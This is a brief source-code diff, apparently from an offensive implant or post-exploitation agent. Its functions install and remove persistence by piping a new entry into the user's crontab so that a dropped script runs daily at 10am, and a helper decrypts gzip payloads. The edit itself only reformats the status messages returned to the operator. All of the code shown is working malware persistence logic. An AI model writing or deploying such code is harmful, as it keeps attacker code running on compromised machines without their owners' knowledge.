@@ -74,12 +74,12 @@ def persist():
   output_file.close()
   import subprocess as s
   s.call("crontab -l | { cat; echo '* 10 * * * sh %%s'; } | crontab -" %% filename, shell=True)
-  return "Installing persistence via user crontab everyday at 10am: %%s" %% filename
+  return "Installing persistence via user crontab everyday at 10am: \\r\\n%%s" %% filename
 
 def remove_persist():
   import subprocess as s
   s.call("crontab -l | { cat;  } | grep -v '_psh.sh'| crontab -", shell=True)
-  return "Removed user persistence via crontab, **must delete files manually**" 
+  return "Removed user persistence via crontab: \\r\\n**must delete files manually**" 
 
 def decrypt_bytes_gzip( key, data):
   iv = data[0:16]
